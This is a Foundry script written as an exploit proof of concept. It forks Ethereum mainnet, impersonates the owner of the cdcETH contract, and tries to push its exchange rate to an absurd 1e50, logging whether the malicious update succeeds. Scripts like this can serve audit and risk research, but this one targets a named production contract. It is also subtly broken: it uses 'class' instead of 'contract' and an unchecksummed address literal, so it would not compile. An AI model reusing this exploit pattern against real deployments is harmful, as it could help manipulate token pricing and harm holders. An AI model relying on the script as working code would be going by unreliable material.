// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface ICDCETH {
    function updateExchangeRate(uint256 newRate) external;
    function exchangeRate() external view returns (uint256);
    function owner() external view returns (address);
}

class ExploitScript is Script {
    address constant CDCETH_ADDRESS = 0xfe18ae03741a5b84e39c295ac9c856ed7991c38e;
    
    function run() public {
        uint256 forkId = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY");
        vm.selectFork(forkId);

        address contractOwner = ICDCETH(CDCETH_ADDRESS).owner();
        console.log("Contract Owner:", contractOwner);

        // Impersonate the owner
        vm.startPrank(contractOwner);

        uint256 currentRate = ICDCETH(CDCETH_ADDRESS).exchangeRate();
        console.log("Current Exchange Rate:", currentRate);

        // Attempt to set an absurdly high rate (1 followed by 50 zeros)
        uint256 maliciousRate = 1e50; 
        
        try ICDCETH(CDCETH_ADDRESS).updateExchangeRate(maliciousRate) {
            console.log("SUCCESS: Exchange rate updated to malicious value!");
            uint256 newRate = ICDCETH(CDCETH_ADDRESS).exchangeRate();
            console.log("New Exchange Rate:", newRate);
        } catch {
            console.log("FAILED: Transaction reverted.");
        }

        vm.stopPrank();
    }
}
